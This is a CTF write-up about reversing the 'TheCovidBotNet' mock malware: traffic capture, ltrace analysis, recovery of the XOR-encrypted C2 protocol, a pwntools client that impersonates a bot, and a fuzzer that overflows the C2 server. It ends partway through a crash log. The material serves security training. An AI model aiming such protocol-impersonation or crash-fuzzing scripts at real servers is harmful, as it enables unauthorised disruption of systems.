# COVID-19 CTF: CovidScammers

[ctf](/tags#ctf ) [wireshark](/tags#wireshark ) [reverse-
engineering](/tags#reverse-engineering ) [ltrace](/tags#ltrace )
[crypto](/tags#crypto ) [python](/tags#python ) [pwntools](/tags#pwntools )
[fuzz](/tags#fuzz ) [bof](/tags#bof ) [pattern-create](/tags#pattern-create )
[shellcode](/tags#shellcode ) [dup2](/tags#dup2 )  
  
May 4, 2020

COVID-19 CTF: CovidScammers

![](https://0xdfimages.gitlab.io/img/covid19ctf-cover.png)

Last Friday I competed with the Neutrino Cannon CTF team in the COVID-19 CTF
created by Threat Simulations and RunCode as a part of DERPCON 2020. I focused
much of my efforts on a section named CovidScammers. It was a really
interesting challenge that encompassed forensics, reverseing, programming,
fuzzing, and exploitation. I managed to get a shell on the C2 server just as I
had to sign off for the day, so I didn’t complete the next steps that unlocked
after that. Still, I really enjoyed the challenge and wanted to show the steps
up to that point.

## Background

The CTF was Jeopardy-style, which meant that there was a board with challenges
of different point values. We had a really good time in the competition,
despite some hiccups at the beginning with the infrastructure due to higher
than expected turn out of over 1000 people, over 404 teams registering at
least a point. Big thanks for [pwneip](https://twitter.com/pwneip),
[landhb](https://github.com/landhb), and anyone else who helped put this event
together.

The final scoreboard was:

![](https://0xdfimages.gitlab.io/img/CTFd_scoreboard_2020-05-02T00_31_23.png) **Place** | **Team** | **Score**  
---|---|---  
1 | [EPT](https://covid19.threatsims.com/team/26) | 3626  
2 | [Neutrino_Cannon](https://covid19.threatsims.com/team/251) | 3566  
3 | [House of Suicide](https://covid19.threatsims.com/team/112) | 3436  
4 | [opentoall](https://covid19.threatsims.com/team/452) | 3301  
5 | [the3000](https://covid19.threatsims.com/team/320) | 3221  
6 | [Exploit Studio](https://covid19.threatsims.com/team/496) | 3216  
7 | [NSL](https://covid19.threatsims.com/team/371) | 3196  
8 | [BurpFiction](https://covid19.threatsims.com/team/514) | 3181  
9 | [c0r3dump](https://covid19.threatsims.com/team/328) | 3011  
10 | [ZenHack](https://covid19.threatsims.com/team/368) | 2991  
  
It was a Jeopardy style, which means the challenges were grouped into
different sections, and challenges within the same section often relied on a
single binary or were otherwise related. I spent much of my effort focused on
a section called `CovidScammers`:

![image-20200502143518951](https://0xdfimages.gitlab.io/img/image-20200502143518951.png)

The flags there aren’t shown in the order they were originally presented or
the order I solved them. I’ll walk through in the order I found them. The C2
is likely no longer up, but I’ve attached the binary
[here](/files/hv19-thecommand7.data) for anyone who wants to look at it.

## Static Analysis - The First Three Flags

The first question gives a good overview for the entire challenge, and the
binary to download. The next asks about the architecture of the binary. The
third question is the name of the malware.

![Free Flag 1](../img/image-20200502143712041.png)|
![Arch](../img/image-20200502144310628.png)  
---|---  
![Who Me?](../img/image-20200502145609915.png)  
  
The file itself is a 32-bit linux executable:

    
    
    root@kali# file client
    client: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=13b974db5ad86f4956c1373a90e6632104f7d1fa, not stripped
    

Knowing that, the architecture for this kind of 32-bit is known as i686, which
solves the challenge.

**[Flag] Arch: i686**

Immediately I’m thinking to get a free flag, check `strings`. Not knowing the
flag format yet, I did a case-insensitive `grep` for `covid`, and found not
only the free flag, but also the name of the malware:

    
    
    root@kali# strings client | grep -i covid
    TheCovidBotNet             <-- malware name
    covid{freeFlagLookatMe}    <-- free flag
    covid_cleanup
    covid_get_filelen
    covid_set_path
    covid_set_headerfunc
    covid_get_status
    covid_set_writearg
    covid_set_headerarg
    covid_global_cleanup
    covid_create
    covid_set_server
    covid_strstatus
    covid_get_bytesreceived
    covid_set_status
    covid_set_port
    covid_set_writefunc
    covid_global_init
    covid_perform
    

**[Flag] Free Flag: covid{freeFlagLookatMe}**

**[Flag] Who Me?: TheCovidBotNet**

## C2 - Scouting

The next flag asked for the C2 server:

![image-20200502213056448](https://0xdfimages.gitlab.io/img/image-20200502213056448.png)

I decided to run the binary. Before doing so, I opened up Wireshark and set it
to capture. On running, nothing happens at the console. It just hangs.

However, in Wireshark, I see traffic. There’s a burst every ~10 seconds:

![image-20200502213853263](https://0xdfimages.gitlab.io/img/image-20200502213853263.png)

Each time there’s a DNS query for `covidfunds.net`, followed by traffic
between my host and that IP on TCP port 8888:

![image-20200502214002325](https://0xdfimages.gitlab.io/img/image-20200502214002325.png)

That’s enough to submit this flag:

**[Flag] Scouting: covidfunds.net**

I took a look at the TCP streams, but they are clearly not in ascii:

![image-20200502214154606](https://0xdfimages.gitlab.io/img/image-20200502214154606.png)
![image-20200502214212429](https://0xdfimages.gitlab.io/img/image-20200502214212429.png)

## Ghidra Fail

At this point I decided to pivot over to Ghidra to take a look at what the was
going on. I opened the binary, and took a look. Since there were not strings
output to the console to center on, I decided to start with `main`.
Unfortunately, the decompile looks like:

    
    
    /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
    
    void main(void)
    
    {
    }
    

I found some other interesting function names, but they also had the same
comment, and empty bodies. For example, `encryptDecrypt`:

    
    
    /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
    
    void encryptDecrypt(void)
    
    {
    }
    

Something weird was definitely going on. Since this was an intermediate level
CTF, I decided to bail on the static RE and look at a dynamic solution. It
sounds like this wasn’t intentional anti-debug on the part of the creators.
Perhaps something is messed up on my Ghidra.

## ltrace FTW - Two More Flags

Before diving into `gdb`, I started with `ltrace`, which provided the next two
flags:

![This is nice, might stay a while...](../img/image-20200502215503718.png)|
![License and Registration Please](../img/image-20200502215515648.png)  
---|---  
  
I reverted my VM, which turned out to be really smart because there’s a bunch
of stuff that doesn’t happen on the second run.

I ran `ltrace -o client-ltrace ./client` and let it run for a couple minutes
before killing it and looking at the output in `client-ltrace`. `ltrace` data
is very loud, but I’ll try to clean it up here. Right away, I see it calling
`strlen` on a base64-encoded string:

    
    
    strlen("Y292aWRmdW5kcy5uZXQ=")                                                                                   = 20
    

Decoding that produces the C2 domain, another way to find that:

    
    
    root@kali:~/derpcon2020echo Y292aWRmdW5kcy5uZXQ= | base64 -d
    covidfunds.net
    

Skipping down a little bit, the next block that catches my eye is this:

    
    
    time(0)                                                                                                          = 1588524191
    srand(0x5eaef49f, 20, 0xffad7828, 0x565d520a)                                                                    = 0
    access("/tmp/.serverauth.tn6aUcM0uM", 0)                                                                         = -1
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x2e67b310
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x3decaef4
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x3acb7017
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x5d3802a5
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x6d70b706
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x5715be75
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x126d2519
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x366daef6
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0xbd2cc9
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x79281ec1
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x1aa47111
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x78e91494
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x4914b80b
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x554e426
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x6237cf95
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x21101529
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x29068782
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x689aa907
    rand(0xf7f12000, 0x565c0fbc, 0x64636261, 0x68676665)                                                             = 0x760d6020
    fopen("/tmp/.serverauth.tn6aUcM0uM", "w+")                                                                       = 0x57b4e7b0
    fwrite("I7J2ugBbp0Kukd61gdB", 20, 1, 0x57b4e7b0)                                                                 = 1
    fclose(0x57b4e7b0)                                                                                               = 0
    access("/etc/init.d/zorr", 0)                                                                                    = -1
    geteuid()                                                                                                        = 0
    fopen("/etc/init.d/zorr", "w+")                                                                                  = 0x57b4e7b0
    fwrite("./client", 9, 1, 0x57b4e7b0)                                                                             = 1
    fclose(0x57b4e7b0)                                                                                               = 0
    

There’s a call to `time(0)`, then `srand`, then it gets the permissions on
`/tmp/.serverauth.tn6aUcM0uM`. It then calls `rand` 19 times, and then opens
that same file in `/tmp` using `fopen`, and writes `uA9oEgenI9wciqohCF2` to
it, and closes it. Finally, it checks access on `/etc/init.d/zorr`, and on
getting a -1, it opens it and writes `./client` into it (this won’t actually
work for persistence because of the relative path, but that’s likely what the
CTF authors wanted). In that output, the information I need for the next two
flags. I just need hashes:

    
    
    root@kali# echo -n "/etc/init.d/zorr" | sha1sum 
    560e4a09711d0adce6379c9dec4d703fb3c3c4f3  -
    

**[Flag] This is nice, might stay a while…:
560e4a09711d0adce6379c9dec4d703fb3c3c4f3**

    
    
    root@kali# echo -n "/tmp/.serverauth.tn6aUcM0uM" | sha1sum 
    5b4e97047851682649a602ad62ba4af567e352a3  -
    

**[Flag] License and Registration Please:
5b4e97047851682649a602ad62ba4af567e352a3**

## Shared Secrets

There’s one more flag about what happens on my machine when this malware is
running:

![image-20200502151955485](https://0xdfimages.gitlab.io/img/image-20200502151955485.png)

This took me a while to realize what a “shared memory object” is. I tried
dumping memory out of `/proc/[pid]`. I Tried poking around with GDB. Then some
Googling tipped me off (thank you last answer with no votes in [this
post](https://stackoverflow.com/questions/5658568/how-to-list-processes-
attached-to-a-shared-memory-segment-in-linux)). Share memory on Linux kernels
2.6 and later use `/dev/shm` as shared memory in the form of RAM. If I look in
the directory while the malware is running, there’s a file:

    
    
    root@kali# ls /dev/shm
    egarots_rroz
    

It contains a string with all capital letters, ending in three `=`:

    
    
    root@kali# cat /dev/shm/egarots_rroz 
    MNXXM2LEPNVUKZLQJF2FGZKDOJCVI3KSFZDHEMDEJ4QX2===
    

This is base32-encoding, and decoding it gives a flag:

    
    
    root@kali# echo -n MNXXM2LEPNVUKZLQJF2FGZKDOJCVI3KSFZDHEMDEJ4QX2=== | base32 -d
    covid{kEepItSeCrETmR.Fr0dO!}
    

**[Flag] Shared Secrets: covid{kEepItSeCrETmR.Fr0dO!}**

## Protocols - Seven Flags

### Prompts

The next seven flags look at the protocols that the malware is using on the
wire to communicate.

![PROTOCOL1](../img/image-20200502152054625.png)|
![PROTOCOL2](../img/image-20200502152103103.png)  
---|---  
![PROTOCOL3](../img/image-20200502152113793.png)  
![PROTOCOL4](../img/image-20200502152203631.png)|
![PROTOCOL5](../img/image-20200502152215248.png)  
![PROTOCOL6](../img/image-20200502152240825.png)| ![Math
Nerd](../img/image-20200502152302645.png)  
  
### ltrace

Picking up right where I left off with `ltrace` output:

    
    
    strlen("covidfunds.net")                                                                                         = 14
    memcpy(0x57b4e920, "covidfunds.net", 14)                                                                         = 0x57b4e920
    sprintf("8888", "%hu", 8888)                                                                                     = 4
    sprintf("NEW I7J2ugBbp0Kukd61gdB\r\n\r\n", "%s %s\r\n\r\n", "NEW", "I7J2ugBbp0Kukd61gdB")                        = 27
    memset(0xffad7730, '\0', 32)                                                                                     = 0xffad7730
    getaddrinfo("covidfunds.net", "8888", 0xffad7730, 0xffad772c)                                                    = 0
    socket(2, 1, 6)                                                                                                  = 4
    setsockopt(4, 1, 20, 0xffad7724)                                                                                 = 0
    connect(4, 0x57b4f7a0, 16, 0xffad772c)                                                                           = 0
    freeaddrinfo(0x57b4f780)                                                                                         = <void>
    strlen("NEW I7J2ugBbp0Kukd61gdB\r\n\r\n")                                                                        = 27
    

It’s referencing the string `covidfunds.net` and 8888. Then there’s a call to
`socket` and `connect`. There’s also the building of the string, `NEW
byrtq5ekuEtfelHzErE\r\n\r\n`. Then the `strlen` is measured to 27.

The data continues, but I didn’t look that closely at the time of solving.

### C2 Strings - ltrace and PCAP

What I focused in on at the time were those `sprintf` calls. There were a
handful:

    
    
    root@kali# grep sprintf client-ltrace 
    sprintf("8888", "%hu", 8888)                                                                                     = 4
    sprintf("NEW I7J2ugBbp0Kukd61gdB\r\n\r\n", "%s %s\r\n\r\n", "NEW", "I7J2ugBbp0Kukd61gdB")                        = 27
    sprintf("INFO TheCovidBotNet\r\n\r\n", "%s %s\r\n\r\n", "INFO", "TheCovidBotNet")                                = 23
    sprintf("8888", "%hu", 8888)                                                                                     = 4
    sprintf("ALIVE I7J2ugBbp0Kukd61gdB\r\n\r\n", "%s %s\r\n\r\n", "ALIVE", "I7J2ugBbp0Kukd61gdB")                    = 29
    sprintf("PUSH uid=0(root) gid=0(root) gro"..., "%s %s\r\n\r\n", "PUSH", "uid=0(root) gid=0(root) groups=0"...)   = 48
    sprintf("PUSH Linux kali 5.5.0-kali2-amd6"..., "%s %s\r\n\r\n", "PUSH", "Linux kali 5.5.0-kali2-amd64 #1 "...)   = 96
    sprintf("PUSH  12:43:23 up  8:39,  1 user"..., "%s %s\r\n\r\n", "PUSH", " 12:43:23 up  8:39,  1 user,  lo"...)   = 70
    sprintf("8888", "%hu", 8888)                                                                                     = 4
    sprintf("ALIVE I7J2ugBbp0Kukd61gdB\r\n\r\n", "%s %s\r\n\r\n", "ALIVE", "I7J2ugBbp0Kukd61gdB")                    = 29
    sprintf("PUSH uid=0(root) gid=0(root) gro"..., "%s %s\r\n\r\n", "PUSH", "uid=0(root) gid=0(root) groups=0"...)   = 48
    sprintf("PUSH Linux kali 5.5.0-kali2-amd6"..., "%s %s\r\n\r\n", "PUSH", "Linux kali 5.5.0-kali2-amd64 #1 "...)   = 96
    sprintf("PUSH  12:43:35 up  8:40,  1 user"..., "%s %s\r\n\r\n", "PUSH", " 12:43:35 up  8:40,  1 user,  lo"...)   = 70
    

One useful thing to notice is that `sprintf` returns the number of bytes in
the resulting string. I opened up the PCAP and look at the TCP streams. The
first stream looks like:

    
    
    00000000  7e 77 67 12 16 79 05 71  25 35 07 26 40 02 7b 47   ~wg..y.q %5.&@.{G
    00000010  34 2a 79 72 37 36 07 0d  0a 0d 0a                  4*yr76.. ...
        00000000  77 77 64 12 0c 17 1c 0a  1e 14 0a 0d 0a 0d 0a      wwd..... .......
    0000001B  79 7c 76 7d 7f 1a 27 26  13 3d 33 2d 54 70 5f 46   y|v}..'& .=3-Tp_F
    0000002B  11 2b 3b 0d 0a 0d 0a                               .+;....
    

I’ll notice the two things `client` sends are 27 bytes and 23 bytes
respectively, which lines up with the first two C2-looking `sprintf` calls:

    
    
    sprintf("NEW I7J2ugBbp0Kukd61gdB\r\n\r\n", "%s %s\r\n\r\n", "NEW", "I7J2ugBbp0Kukd61gdB")                        = 27
    sprintf("INFO TheCovidBotNet\r\n\r\n", "%s %s\r\n\r\n", "INFO", "TheCovidBotNet")                                = 23
    

### Decrypt

I want to XOR the two strings together to see if I can find some kind of key,
single byte or longer. I turned to the Python3 Repl. I usually start by
loading in the two strings, and making sure I can `zip` them together:

    
    
    >>> plain = "NEW I7J2ugBbp0Kukd61gdB\r\n\r\n"
    >>> cipher = "7e 77 67 12 16 79 05 71 25 35 07 26 40 02 7b 47 34 2a 79 72 37 36 07 0d 0a 0d 0a"
    >>> [(x,y) for x,y in zip(plain,cipher.split(' '))]
    [('N', '7e'), ('E', '77'), ('W', '67'), (' ', '12'), ('I', '16'), ('7', '79'), ('J', '05'), ('2', '71'), ('u', '25'), ('g', '35'), ('B', '07'), ('b', '26'), ('p', '40'), ('0', '02'), ('K', '7b'), ('u', '47'), ('k', '34'), ('d', '2a'), ('6', '79'), ('1', '72'), ('g', '37'), ('d', '36'), ('B', '07'), ('\r', '0d'), ('\n', '0a'), ('\r', '0d'), ('\n', '0a')]
    

Everything lines up, and I did get rid of the double spaces in the hex.

To XOR, I need each as an int. I’ll use `ord` on the character, and `int(y,
16)` on the hex bytes. Then I’ll just change `,` to `^`, and run `chr` around
the resulting int. I can use `''.join` to make a string:

    
    
    >>> [chr(ord(x)^int(y,16)) for x,y in zip(plain,cipher.split(' '))]
    ['0', '2', '0', '2', '_', 'N', 'O', 'C', 'P', 'R', 'E', 'D', '0', '2', '0', '2', '_', 'N', 'O', 'C', 'P', 'R', 'E', '\x00', '\x00', '\x00', '\x00']
    >>> ''.join([chr(ord(x)^int(y,16)) for x,y in zip(plain,cipher.split(' '))])
    '0202_NOCPRED0202_NOCPRE\x00\x00\x00\x00'
    

That’s the XOR key. I actually recognize that from the `ltrace` data. There
were lots of lines like:

    
    
    strlen("0202_NOCPRED")                                                                                           = 12
    

I can test the other string. I’ll grab the hex from the PCAP (not included the
last four `0d 0a 0d 0a` which are clearly not encrypted), and use `cycle` to
get a string of repeating key as long as needed to match the cipher text.

    
    
    >>> cipher = "79 7c 76 7d 7f 1a 27 26 13 3d 33 2d 54 70 5f 46 11 2b 3b"
    >>> ''.join([chr(ord(x)^int(y,16)) for x,y in zip(cycle('0202_NOCPRED'),cipher.split(' '))])
    'INFO TheCovidBotNet'
    

If the key is the same, the same should work on the data coming back from the
webserver:

    
    
    >>> cipher = "77 77 64 12 0c 17 1c 0a 1e 14 0a"
    >>> ''.join([chr(ord(x)^int(y,16)) for x,y in zip(cycle('0202_NOCPRED'),cipher.split(' '))])
    'GET SYSINFO'
    

Now I can translate the entire conversation across a few TCP streams:

    
    
    client: NEW I7J2ugBbp0Kukd61gdB
    server: GET SYSINFO
    client: INFO TheCovidBotNet
    # 10 second sleep
    client: ALIVE I7J2ugBbp0Kukd61gdB
    server: CMD id
    client: PUSH uid=0(root) gid=0(root) groups=0(root)\n
    server: CMD uname -a
    client: PUSH Linux kali 5.5.0-kali2-amd64 #1 SMP Debian 5.5.17-1kali1 (2020-04-21) x86_64 GNU/Linux\n
    server: CMD uptime
    client: PUSH  12:43:23 up  8:39,  1 user,  load average: 2.98, 1.97, 1.40\n
    # 10 second sleep
    # repeat previous conversation
    

This answers the flags:

**[Flag] Protocol1: NEW I7J2ugBbp0Kukd61gdB**

**[Flag] Protocol2: GET SYSINFO**

**[Flag] Protocol3: INFO TheCovidBotNet**

**[Flag] Protocol4: ALIVE I7J2ugBbp0Kukd61gdB**

**[Flag] Protocol5: CMD id**

**[Flag] Protocol6: PUSH uid=0(root) gid=0(root) groups=0(root)**

**[Flag] Math Nerd: 0202_NOCPRED**

## Programming1

Given my understanding of the protocol, I now need to write a client.

![image-20200502152402621](https://0xdfimages.gitlab.io/img/image-20200502152402621.png)

I used `pwntools` for communications since it allows for easy reading to and
from sockets.

It’s always hard to show how a script is built out of trial and error. This
didn’t take too much, but some. For example, it took me a while to realize
that `recvline()` was breaking things when the `I` in `GET SYSINFO` was
encrypted to `\n`. Using `context.log_level = 'DEBUG'` allowed me to see the
traffic coming to and from the server, and change it to
`recvuntil('\r\n\r\n')`. I also decided I preferred not to accept just any
command from the server and run it. The server tended to be sending the
`uname` command, so I just hard-coded the response.

    
    
    #!/usr/bin/env python3
    
    from pwn import *
    from itertools import cycle
    
    
    def encode(s):
        return ''.join([chr(x^y) for x,y in zip(s,cycle(b'0202_NOCPRED'))])
    
    #context.log_level = "DEBUG"
    port = 31500
    s = remote('research.threatsims.com',port)
    s.send(encode(b"NEW Ep5aD11k1d27b9ro3EF") + "\r\n\r\n")
    print(encode(s.recvuntil('\r\n\r\n')[:-4]))
    s.send(encode(b"INFO TheCovidBotNet") + "\r\n\r\n")
    s.close()
    
    s = remote('research.threatsims.com',port)
    s.send(encode(b"ALIVE Ep5aD11k1d27b9ro3EF") + "\r\n\r\n")
    print(encode(s.recvuntil('\r\n\r\n')[:-4]))
    
    s.send(encode(b"PUSH Linux kali 5.5.0-kali2-amd64 #1 SMP Debian 5.5.17-1kali1 (2020-04-21) x86_64 GNU/Linux") + "\r\n\r\n")
    print(encode(s.recvuntil('\r\n\r\n')[:-4]))
    
    s.close()
    

This returned the flag:

    
    
    root@kali# ./client.py
    [+] Opening connection to research.threatsims.com on port 31500: Done
    GET SYSINFO
    [*] Closed connection to research.threatsims.com port 31500
    [+] Opening connection to research.threatsims.com on port 31500: Done
    CMD uname
    covid{oNeDoEsNoTsImPlYr3GisTeR}
    [*] Closed connection to research.threatsims.com port 31500
    

**[Flag] Programming1: covid{oNeDoEsNoTsImPlYr3GisTeR}**

## Fuzzing for Two More

### Prompt

Now that I can speak the malware’s protocol, I’m challenged to crash the
server for two flags:

![PROGRAMMING2](../img/image-20200502152506647.png)|
![EXPLOIT1](../img/image-20200502152517233.png)  
---|---  
  
When I `nc` to the research server, it holds the connection open, and gives me
a port to start fuzzing:

    
    
    root@kali# nc research.threatsims.com 9000
    Start fuzzing on port 57929
    
    If you crash the server a report with a flag will be sent in this channel
    

### Strategy

I’ve seen four possible keywords sent from the client: `NEW`, `INFO`, `ALIVE`,
and `PUSH`. I first tried a simple loop that sent each command plus different
lengths of `A`, but I didn’t get a crash. I thought that maybe to interact
with each command, the connection had to be in the right state. So I wrote a
more complex fuzzer that looked at each command and what might need to come
before it in order for the server to handle it and potentially overflow it.

### Code

The code that eventually worked was this:

    
    
    #!/usr/bin/env python3
    
    import sys
    import time
    from pwn import *
    from itertools import cycle
    
    
    port = sys.argv[1]
    
    def encode(s):
        return ''.join([chr(x^y) for x,y in zip(s,cycle(b'0202_NOCPRED'))])
    
    
    def gen_cmd(s):
        return encode(s.encode()) + "\r\n\r\n"
    
    #context.log_level = "DEBUG"
    context.log_level = "ERROR"
    
    # FUZZ NEW
    for i in [100, 300, 600, 1000, 10000]:
        print(f'NEW A*{i}')
        s = remote('research.threatsims.com',port)
        s.send(gen_cmd(f'NEW {"A"*i}'))
        s.recvuntil('\r\n\r\n')
        s.close()
    
    # FUZZ INFO
    for i in [100, 300, 600, 1000]:
        print(f'INFO A*{i}')
        s = remote('research.threatsims.com',port)
        s.send(gen_cmd(f'NEW Ep5aD11k1d27b9ro3EF'))
        s.recvuntil('\r\n\r\n')
        s.send(gen_cmd(f'INFO {"A"*i}'))
        s.recvuntil('\r\n\r\n')
        s.close()
    
    # FUZZ ALIVE
    for i in [100, 300, 600, 1000, 10000]:
        print(f'ALIVE A*{i}')
        s = remote('research.threatsims.com',port)
        s.send(gen_cmd(f'ALIVE {"A"*i}'))
        s.recvuntil('\r\n\r\n')
        s.close()
    
    # FUZZ PUSH
    for i in [100, 300, 600, 1000, 10000]:
        print(f'PUSH A*{i}')
        s = remote('research.threatsims.com',port)
        s.send(gen_cmd('ALIVE Ep5aD11k1d27b9ro3EF'))
        s.recvuntil('\r\n\r\n')
        s.send(gen_cmd(f'PUSH {"A"*i}'))
        s.recvuntil('\r\n\r\n')
        s.close()
    

When I run this, I get a crash when it can’t read a response after `PUSH` with
600 `A`:

    
    
    root@kali# ./fuzz.py 59608
    NEW A*100
    NEW A*300
    NEW A*600
    NEW A*1000
    NEW A*10000
    INFO A*100
    INFO A*300
    INFO A*600
    INFO A*1000
    ALIVE A*100
    ALIVE A*300
    ALIVE A*600
    ALIVE A*1000
    ALIVE A*10000
    PUSH A*100
    PUSH A*300
    PUSH A*600
    Traceback (most recent call last):
      File "./fuzz.py", line 54, in <module>
        s.recvuntil('\r\n\r\n')
      File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py", line 310, in recvuntil
        res = self.recv(timeout=self.timeout)
      File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py", line 82, in recv
        return self._recv(numb, timeout) or b''
      File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py", line 160, in _recv
        if not self.buffer and not self._fillbuffer(timeout):
      File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py", line 131, in _fillbuffer
        data = self.recv_raw(self.buffer.get_fill_size())
      File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
        raise EOFError
    EOFError
    

Back at the research server, it’s dumped a crash report and a flag:

    
    
    [+] received connection from 172.31.32.50
            [*] Got new registration for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [+] received connection from 172.31.32.50
            [*] Got new registration for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [+] received connection from 172.31.32.50
            [*] Got new registration for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [+] received connection from 172.31.32.50
            [*] Got new registration for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [+] received connection from 172.31.32.50
    [+] received connection from 172.31.32.50
            [*] Got new registration for Ep5aD11k1d27b9ro3EF
    [+] received connection from 172.31.32.50
            [*] Got new registration for Ep5aD11k1d27b9ro3EF
    [+] received connection from 172.31.32.50
            [*] Got new registration for Ep5aD11k1d27b9ro3EF
    [+] received connection from 172.31.32.50
            [*] Got new registration for Ep5aD11k1d27b9ro3EF
    [+] received connection from 172.31.32.50
            [*] Got keepalive for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            [-]Client not registered
    [+] received connection from 172.31.32.50
